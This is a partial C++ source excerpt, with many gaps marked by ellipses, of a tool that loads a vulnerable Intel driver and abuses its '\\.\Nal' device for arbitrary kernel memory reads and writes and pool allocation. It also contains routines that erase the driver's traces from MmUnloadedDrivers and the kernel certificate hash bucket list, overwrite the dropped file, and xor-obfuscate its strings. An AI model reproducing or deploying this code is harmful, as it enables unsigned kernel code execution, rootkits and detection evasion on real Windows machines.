...
{
	const HANDLE file_handle = CreateFileA(xor ("\\\\.\\Nal"), FILE_ANY_ACCESS, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
...
HANDLE intel_driver::Load()
{
	...
	//std::cout << xor ("[<] Loading vulnerable driver") << std::endl;
	...
	{
		std::cout << xor ("[-] Failed to get temp path") << std::endl;
		return nullptr;
	}
	...
	{
		std::cout << xor ("[-] Failed to create vulnerable driver file") << std::endl;
		return nullptr;
	}

	if (!service::RegisterAndStart(driver_path))
	{
		std::cout << xor ("[-] Failed to register and start service for the vulnerable driver") << std::endl;
		std::remove(driver_path.c_str());
		return nullptr;
	}

	return CreateFileA(xor ("\\\\.\\Nal"), GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
}

void intel_driver::Unload(HANDLE device_handle)
{
	//std::cout << xor ("[<] Unloading vulnerable driver") << std::endl;
	...
	{
		std::cout << xor ("[!] Error dumping shit inside the disk") << std::endl;
	}
	else {
		//std::cout << xor ("[+] Vul driver data destroyed before unlink") << std::endl;
	}
	file_ofstream.close();
	delete[] randomData;
...
bool intel_driver::WriteToReadOnlyMemory(HANDLE device_handle, uint64_t address, void* buffer, uint32_t size)
{
	...
	{
		std::cout << xor ("[-] Failed to translate virtual address 0x") << reinterpret_cast<void*>(address) << std::endl;
		return false;
	}
	...
	{
		std::cout << xor ("[-] Failed to map IO space of 0x") << reinterpret_cast<void*>(physical_address) << std::endl;
		return false;
	}
	...
	if (!UnmapIoSpace(device_handle, mapped_physical_memory, size))
		std::cout << xor ("[!] Failed to unmap IO space of physical address 0x") << reinterpret_cast<void*>(physical_address) << std::endl;
...
uint64_t intel_driver::AllocatePool(HANDLE device_handle, nt::POOL_TYPE pool_type, uint64_t size)
{
	...
	{
		std::cout << xor ("[!] Failed to find ExAllocatePool") << std::endl;
		return 0;
	}
...
bool intel_driver::ClearMmUnloadedDrivers(HANDLE device_handle)
{
	...
	if (!ReadMemory(device_handle, object + 0x8, &device_object, sizeof(device_object)) || !device_object) {
		std::cout << xor ("[!] Failed to find device_object") << std::endl;
		return false;
	}
	...
	if (!ReadMemory(device_handle, device_object + 0x8, &driver_object, sizeof(driver_object)) || !driver_object) {
		std::cout << xor ("[!] Failed to find driver_object") << std::endl;
		return false;
	}
	...
	if (!ReadMemory(device_handle, driver_object + 0x28, &driver_section, sizeof(driver_section)) || !driver_section) {
		std::cout << xor ("[!] Failed to find driver_section") << std::endl;
		return false;
	}
	...
	if (!ReadMemory(device_handle, driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name)) || us_driver_base_dll_name.Length == 0) {
		std::cout << xor ("[!] Failed to find driver name") << std::endl;
		return false;
	}
	...
	if (!WriteMemory(device_handle, driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name))) {
		std::cout << xor ("[!] Failed to write driver name length") << std::endl;
		return false;
	}
...
bool intel_driver::ClearKernelHashBucketList(HANDLE device_handle) {
	...
	//printf("[+] g_KernelHashBucketList ptr: %p\n", sig);
	//printf("[+] g_HashCacheLock ptr: %p\n", sig2);
	...
	//std::cout << "[+] CertHash: " << (const char*)prev->CertHash << std::endl;
